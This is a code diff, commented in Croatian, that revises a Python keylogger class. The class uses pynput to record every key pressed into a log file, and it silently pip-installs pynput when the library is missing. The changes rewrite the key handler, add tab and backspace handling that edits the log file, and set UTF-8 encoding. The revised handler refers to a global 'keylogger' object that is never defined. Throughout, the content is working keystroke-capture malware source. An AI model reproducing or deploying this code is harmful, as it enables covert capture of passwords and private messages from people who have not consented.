@@ -2,10 +2,10 @@ import subprocess # za instaliranje pynputa ukoliko nije instaliran
 import sys        # za instaliranje pynputa ukoliko nije instaliran
 
 try:
-    import pynput.keyboard
+    from pynput import keyboard 
 except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
-    import pynput.keyboard # pynput se koristi za detekciju pritisnutih tipki
+    from pynput import keyboard # pynput se koristi za detekciju pritisnutih tipki
 
 class Keylogger:
 
@@ -18,40 +18,46 @@ class Keylogger:
 
 ##########################################################################################################################################
 
-    def keyPressed(self, key):
+    def on_press(key):
         try:
-            # Ako je pritisnuta uobičajena tipka (slovo ili broj)
-            if hasattr(key, 'char') and key.char is not None:
-                self.log += key.char
-            elif key == pynput.keyboard.Key.enter:
-                # Ako je pritisnut ENTER, zapisuje novu liniju
-                self.log += "\n"
-            elif key == pynput.keyboard.Key.space:
-                # Ako je pritisnut SPACE, dodaje razmak
-                self.log += " "
-            elif key == pynput.keyboard.Key.backspace:
-                # Ako je pritisnut BACKSPACE, briše posljednji char
-                self.log = self.log[:-1]
+            keylogger.log += format(key.char)
         except AttributeError:
-            # Ovo je fallback za nespecificirane charactere, ukoliko ne postoji 'char' atribut
-            self.log += str(key)
+            if key == keyboard.Key.space:
+                keylogger.log += " "
+            elif key == keyboard.Key.enter:
+                keylogger.log += "\n"
+            elif key == keyboard.Key.tab:
+                keylogger.log += "[tab]"
+            elif key == keyboard.Key.backspace:
+                keylogger.delete_last()
 
         # Ažurira log file
-        self.update_log()
+        keylogger.update_log()
 
 ##########################################################################################################################################
 
     def update_log(self):
         # Otvori file u režimu dodavanja (append), kako bi se zapisivalo novo logiranje bez brisanja prethodnih podataka
-        with open(self.log_path, "a") as file:
+        with open(self.log_path, "a", encoding="utf-8") as file:
             file.write(self.log)
             self.log = ""  # Resetira log nakon što je upisan kako nebi došlo do dupliciranja
 
 ##########################################################################################################################################
 
+    def delete_last(self):
+        # Otvori file u režimu čitanja (read), kako bi se pročitao content file-a
+        with open(self.log_path, "r", encoding="utf-8") as file:
+            content = file.read()
+            if content: # ako nije prazan
+                content = content[:-1] # cijeli sadrzaj txt datoteke se kopira osim posljednjeg znaka
+            with open(self.log_path, "w", encoding="utf-8") as file:
+                file.write(content) # zapisi novi sadrzaj
+
+##########################################################################################################################################
+
     def start(self):
-        # Kreira listener koji prati pritisnute tipke
-        with pynput.keyboard.Listener(on_press=self.keyPressed) as listener:
+        with keyboard.Listener(
+                on_press=Keylogger.on_press) as listener:
             listener.join()
 
 ##########################################################################################################################################
